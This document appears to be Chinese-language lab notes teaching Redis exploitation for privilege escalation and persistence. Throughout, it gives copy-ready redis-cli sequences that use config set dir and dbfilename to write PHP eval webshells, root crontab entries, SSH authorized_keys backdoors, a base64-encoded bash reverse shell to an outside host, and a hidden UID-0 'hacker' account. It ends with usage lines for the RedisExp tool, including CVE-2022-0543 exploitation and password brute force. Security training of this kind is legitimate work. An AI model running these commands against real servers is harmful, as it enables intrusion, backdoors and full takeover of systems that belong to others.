[TOC]



# ==权限维持与Redis提权==

## 一、Redis基础回顾

### 1、安装与配置

```shell
Redis服务器端： 
Redis客户端：
```

### 2、配置远程认证

```shell
编辑 redis.conf 配置文件，修改如下选项：
查找 bind，将已有的 bind 127.0.0.1 -::1 注释掉

查找 protected-mode yes，将其修改为：protected-mode no
也可以保留:protected-mode yes
但是设置密码：requirepass 123456

完成上述配置后，使用 pkill redis-server 停止 Redis 服务器，再重启 Redis 即可
```

此时，使用Redis客户端登录时，必须通过参数 -a 指定密码

```shell
./redis-cli -h 192.168.112.188 -p 6379 -a 123456
如果登录本机，并且端口号是默认的6379，则可以不用使用参数 -h 和 -p
如果是远程登录Redis服务器，则 -h 必须明确指定
```

### 3、基础命令

```shell
set key value
get key 
config set key value
save
```

![image-20230213233746925](https://gitee.com/ymq_typroa/typroa/raw/main/20230213233747.png)

## 二、Redis提权操作

> redis 在执行持久化操作时，会将 缓存 数据库中的内容保存在硬盘上，此时就会生成文件，该文件的地址就是 redis.conf 配置文件中的 dir 参数和 dbfilename 参数 组成的文件绝对路径
>
> > 比如设置 dir=/opt/lampp/htdocs dbfilename=shell.php
> >
> > 那么，持久化进行时就会生成 /opt/lampp/htdocs/shell.php 文件
>
> 

核心：

Redis以Root启动

成功可以访问到 Redis

![image-20240923232542581](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923232542581.png)

### 1、配置Redis

```shell
先尝试匿名登录Redis： redis-cli.exe -h 192.168.112.188

requirepass 字段可以设置密码，也可以不要求密码，如果设置了密码则使用 SNetCracker 进行爆破
```

### 2、执行以下脚本，测试是否成功

#### 尝试写入木马

> 该原理是利用了 redis 非关系型（缓存型）数据库的持久化操作实现写文件

写入木马前：

![image-20240924170702798](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240924170702798.png)

```shell
192.168.230.147:6379> config set dir /opt/lampp/htdocs/img
OK
192.168.230.147:6379> config set dbfilename shell.php
OK
192.168.230.147:6379> set mm "<?php @eval($_POST[a]);?>"
OK
192.168.230.147:6379> save
OK
```

![image-20240924170754399](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240924170754399.png)

写入木马后：

![image-20240924170819463](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240924170819463.png)

说明可以正常利用 redis 写入木马

#### 尝试写一个 root 的 crontab 定时任务

```shell
192.168.230.147:6379> config set dir /var/spool/cron/
OK
192.168.230.147:6379> config set dbfilename root
OK
192.168.230.147:6379> set mm "\n\n*/1 * * * * echo '<?php @eval($_POST[a]);?>' > /tmp/test.txt\n\n"
OK
192.168.230.147:6379> get mm
"\n\n*/1 * * * * echo '<?php @eval($_POST[a]);?>' > /tmp/test.txt\n\n"
192.168.230.147:6379> save
OK
```

![image-20240924172101380](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240924172101380.png)

去查看一下 root 的 crontab 

![image-20240924172324790](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240924172324790.png)

说明确实写入成功了

![image-20240924214048605](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240924214048605.png)

redis 本身无法执行 操作系统指令

但是 redis 可以写文件，就比如写入root用户的 crontab 再或者直接写入后门

### 3、此时以 root 账户运行crontab -l，查看是否写入了一条新的定时任务

```shell
[root@centqiang bin]# crontab -l
REDIS0009 redis-ver6.2.5
redis-bitse             used-memV
preamble~ phone                     
1881234567studentsw@QQH zhangsan,lisi,w                                                             wumynameqiangaddrchengducount
*/1 * * * * echo testing > /tmp/test.txt         # 此处写入定时任务成功

sexmalenamewoniuage 1
,[root@centqiang bin]#
```

### 4、利用Windows的SSH命令生成公钥

```shell
ssh-keygen -t rsa
```

![image-20240926215011682](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926215011682.png)

![image-20240926215047498](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926215047498.png)

上传 id_res.pub 至 Linux 服务器的 /root/.ssh 目录下 并命名为 authorized_keys

![image-20240926215525212](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926215525212.png)

当然，由于上次输入了 密码短语用于保护 rsa 密钥，所以再次使用 ssh 登录时，不再是要求输入登录密码了，而是要求输入 密码短语 passphrase

![image-20240926215741543](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926215741543.png)

### 5、利用Redis将公钥写入目标主机

当我们获取 redis 服务器登录权限后，可以利用 redis 持久化性质写入 root 的 crontab 定时任务，使得 攻击机的 ssh 公钥写入 目标服务器

（1）先利用Redis创建/root/.ssh目录

```shell
192.168.112.188:6379> set 0 "\n\n*/1 * * * * mkdir -p /root/.ssh \n\n"
OK
192.168.112.188:6379> config set dir /var/spool/cron/
OK
192.168.112.188:6379> config set dbfilename root
OK
192.168.112.188:6379> save
OK

等待一分钟
```

![image-20240926220303125](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926220303125.png)

进入实验环境发现确实成功写入，说明此时文件和目录已经创建成功

![image-20240926220327616](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926220327616.png)

（2）再写入公钥文件数据

```shell
192.168.112.188:6379> set 0 "\n\n*/1 * * * * echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBCGGfboJ7i1deQRFchk9cqqojY9apL2hzCcOUa9hF3duNoGQILEeImhdSwFYpahd6hnNLoIULl+vBuKK9iJCTtF0yemhh/LHEEH5xCvBM7wu2hP4ZyO/0YCwTizDxYsVFFWzx44+IpQ40IsZXLs1h9GhWhoO6cDs995ojxd7N9S/jn9grxY2V0kR5j0lh11fAhRe2DwGtSEYwaT7/1wEERUW7YPAgGpWYaAloEgPk+lxibMzhXYy8H01lRs7Jo+JQDVzzifdpq2KW1i/R/KPQjd/NgMqHFYL36KVBxtLqPmbSI4rTDqtoheQWegnaI/sZOS8lmAXjsfocVHqR/+8J denny@Qiang' > /root/.ssh/authorized_keys\n\n"
OK
192.168.112.188:6379> config set dir /var/spool/cron/
OK
192.168.112.188:6379> config set dbfilename root
OK
192.168.112.188:6379> save
OK
再等待一分钟
```

![image-20240926220621089](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926220621089.png)

进入实验服务器发现 crontab 再次成功写入

![image-20240926220659730](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926220659730.png)

等待一分钟，进入实验服务器发现文件写入成功

![image-20240926220828308](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926220828308.png)

### 6、利用Windows自带SSH免密登录

```shell
C:\Users\Denny>ssh root@192.168.112.188
Last login: Sun Dec  5 11:31:40 2021 from 192.168.112.1
[root@centqiang ~]#
```

![image-20240926220910494](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926220910494.png)

正是我们使用密钥生成之后链接 ssh 的状况，攻击时，使用空的密码短语生成 公私钥对就好了

Enjoy It ！

### 7、除此之外

也可以直接利用设定持久化数据文件的方式直接写WebShell

```shell
192.168.112.188:6379> set myshell "<?php eval($_POST['code']); ?>"
192.168.112.188:6379> config set dir /opt/lampp/htdocs/
192.168.112.188:6379> config set dbfilename myshell.php
192.168.112.188:6379> save
```

或执行反弹Shell

```shell
192.168.112.188:6379> set 1 "\n\n* * * * * echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4yMTIvNDQ0NCAwPiYx | base64 -d| bash\n\n"
192.168.112.188:6379> config set dir /var/spool/cron/
192.168.112.188:6379> config set dbfilename root
192.168.112.188:6379> save
```

或其他可正常执行的命令等，如创建一个影子root用户等

```shell
set 2 "\n\n* * * * * echo hacker:12345678|/usr/sbin/chpasswd\n\n"
set 1 "\n\n* * * * * /usr/sbin/useradd -o -u 0 -g 0 hacker\n\n"
```

## 三、RedisExp漏洞利用工具

下载地址：https://github.com/Mx1014/RedisEXP

命令用法：

```shell
主从复制命令执行:
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console

Linux:
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -so exp.so
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console -so exp.so

主从复制文件上传:
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -rfile dump.rdb -lfile dump.rdb -upload

主动关闭主从复制:
RedisExp.exe -rhost 192.168.211.131 -slaveof

Lua沙盒绕过命令执行 CVE-2022-0543:
RedisExp.exe -rhost 192.168.211.131 -lua -console

备份写 Webshell:
RedisExp.exe -rhost 192.168.211.131 -shell

Linux 写计划任务:
RedisExp.exe -rhost 192.168.211.131 -crontab

Linux 写 SSH 公钥:
RedisExp.exe -rhost 192.168.211.131 -ssh

爆破 Redis 密码:
RedisExp.exe -rhost 192.168.211.131 -brute -pwdf ../pass.txt

执行 Redis 命令:
RedisExp.exe -rhost 192.168.211.131 -cli
```

